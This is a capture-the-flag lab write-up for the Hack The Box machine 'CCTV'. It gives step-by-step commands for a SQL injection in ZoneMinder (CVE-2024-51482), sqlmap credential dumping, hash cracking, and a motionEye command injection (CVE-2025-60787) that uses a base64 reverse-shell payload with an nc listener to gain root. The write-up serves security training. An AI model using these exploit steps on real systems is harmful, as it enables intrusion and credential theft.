# HTB - CCTV

**Difficulty:** Easy
**OS:** Linux
**Date Completed:** 08 Apr 2026

## Summary

CCTV is an Easy Linux machine centered around SecureVision, a fictional CCTV/security company. The foothold comes from a SQL injection vulnerability (CVE-2024-51482) in ZoneMinder, which is used to dump credentials from the database. One of the cracked passwords is reused for SSH. From there, internal enumeration reveals a second web application, motionEye, running only on localhost. Credentials extracted from its config file grant access, and a command injection vulnerability in motionEye (CVE-2025-60787) leads directly to a root shell — bypassing the intermediate user entirely.

## Reconnaissance

Started with a full TCP port scan:

```bash
nmap -sC -sV -p- <TARGET_IP>
```

Two ports open:

| Port | Service | Details |
|------|---------|---------|
| 22 | SSH | OpenSSH 9.6p1 (Ubuntu) |
| 80 | HTTP | Apache 2.4.58 (Ubuntu) |

Port 80 redirects to `http://cctv.htb/`, added to `/etc/hosts`.

## Web Enumeration

`http://cctv.htb/` hosts a website for SecureVision, with a "Staff Login" button leading to a **ZoneMinder** panel.

Default credentials `admin:admin` work immediately, granting access to the ZoneMinder dashboard, which reports version **v1.37.63**.

## Foothold — SQL Injection (CVE-2024-51482)

### Finding the vulnerability

ZoneMinder v1.37.63 is affected by **CVE-2024-51482**, a boolean-based blind SQL injection in the `tid` parameter of `web/ajax/event.php` (versions up to 1.37.64).

A public PoC exists on GitHub, but it did not work reliably against the target, so the vulnerability was verified manually instead.

### Manual verification

Using the authenticated session cookie (`ZMSESSID`) captured from the browser:

```bash
curl -v -b "ZMSESSID=<SESSION_COOKIE>" \
  "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1"
```

Response confirms the endpoint is reachable:

```
{"result":"Ok","response":0}
```

### Exploiting with sqlmap

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
  --cookie="ZMSESSID=<SESSION_COOKIE>" --batch --level=3 --risk=3
```

`sqlmap` confirms a **time-based blind** injection on the `tid` parameter:

```
Parameter: tid (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: ...tid=1 AND (SELECT 5515 FROM (SELECT(SLEEP(5)))gYDX)
```

### Dumping credentials

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
  --cookie="ZMSESSID=<SESSION_COOKIE>" --batch -D zm -T Users -C Username,Password --dump
```

Three users extracted, with bcrypt password hashes.

> Note: time-based blind injection is slow — every character requires multiple timed requests, and the session cookie can expire mid-extraction.

### Cracking the hashes

```bash
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
```

Two of the three hashes crack, including `mark`.

### SSH access

The cracked password for `mark` is reused for SSH:

```bash
ssh mark@<TARGET_IP>
```

The user flag is **not** present in `/home/mark/` — it lives in `/home/sa_mark/`, which is not accessible with current permissions. A pivot is required.

## Lateral Movement & Privilege Escalation

### Internal enumeration

```bash
ss -tlnp
```

Reveals internal-only services:

| Port | Service |
|------|---------|
| 8765 | motionEye 0.43.1b4 (CCTV web UI) |
| 8888 | MediaMTX media server |

### Accessing motionEye

Port 8765 is bound to localhost only. An SSH tunnel exposes it locally:

```bash
ssh -L 8765:127.0.0.1:8765 mark@<TARGET_IP>
```

### Extracting motionEye credentials

motionEye stores configuration in `/etc/motioneye/`, readable with current permissions:

```bash
strings /etc/motioneye/motion.conf | grep -i pass
```

The admin password is exposed in the config file, granting access to the motionEye web UI.

### Command Injection via image_file_name (CVE-2025-60787)

motionEye 0.43.1b4 is vulnerable to **CVE-2025-60787**, an OS command injection through the `image_file_name` configuration parameter. motionEye evaluates the filename through the shell when saving snapshots — a `$(...)` command substitution gets executed.

The web UI has frontend-only JavaScript validation (`configUiValid`) blocking special characters, bypassed via the browser console:

```javascript
configUiValid = function() { return true; };
```

Payload set in **Settings → Still Images → Image File Name**:

```
$(echo <BASE64_REVERSE_SHELL_PAYLOAD> | base64 -d | bash).%Y-%m-%d-%H-%M-%S
```

The base64 payload decodes to a standard reverse shell pointing back to the attacker's tun0 IP.

Listener on the attacking machine:

```bash
nc -lvnp 9001
```

Saving the configuration and triggering a snapshot fires the payload. motionEye runs as **root**, so the injection grants immediate root access — the intermediate pivot to `sa_mark` is skipped entirely, and both flags are captured from the same shell.

## Attack Chain Summary

```
Nmap recon (SSH + Apache)
    → ZoneMinder default creds (admin:admin)
        → CVE-2024-51482 (SQLi via tid parameter)
            → Dump Users table → crack hashes
                → SSH as mark (password reuse)
                    → Internal enum → motionEye on port 8765
                        → Credentials leaked in plaintext config
                            → CVE-2025-60787 (command injection)
                                → Root shell → user.txt + root.txt captured
```

## Lessons Learned

- Default credentials are still a common entry point — always try them first.
- Frontend validation is not a security control. Anything enforced only in JavaScript can be bypassed from the browser console.
- Config files with plaintext or weakly-protected credentials are a frequent source of lateral movement inside a box.
- Password reuse between web application accounts and system accounts (SSH) remains one of the most reliable pivots.
